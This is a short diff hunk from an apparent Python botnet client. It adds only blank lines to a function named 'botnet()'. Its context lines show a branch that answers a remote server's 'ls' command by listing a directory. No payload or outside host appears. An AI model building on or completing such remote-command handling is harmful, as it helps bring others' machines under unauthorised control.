@@ -413,6 +413,41 @@ def botnet():
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+			
+
+
+
+
+
+
+
+
 		elif server_command=='ls':
 			output = ''
 			for obj in listdir():
